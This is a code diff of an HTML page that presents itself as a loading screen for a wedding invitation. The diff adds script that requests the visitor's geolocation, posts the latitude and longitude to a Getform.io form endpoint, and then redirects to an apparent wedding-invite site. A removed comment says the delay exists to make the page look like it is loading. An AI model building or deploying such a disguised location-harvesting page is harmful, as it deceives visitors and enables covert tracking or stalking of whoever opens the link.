@@ -38,7 +38,7 @@
   <p>Preparing your special invitation... Please wait...</p>
 
   <script>
-    // Delay to make it look like loading
+    // Wait 2 seconds to show loader animation
     setTimeout(function() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(success, error);
@@ -54,5 +54,28 @@
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
-      // Send location to Getform
-      fetch("https://getform
+      // Send the captured location to your Getform.io
+      fetch("https://getform.io/f/bnlqdjlb", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: latitude,
+          longitude: longitude
+        })
+      }).then(response => {
+        window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
+      }).catch(error => {
+        window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
+      });
+    }
+
+    function error(err) {
+      console.warn(`ERROR(${err.code}): ${err.message}`);
+      window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
+    }
+  </script>
+
+</body>
+</html>
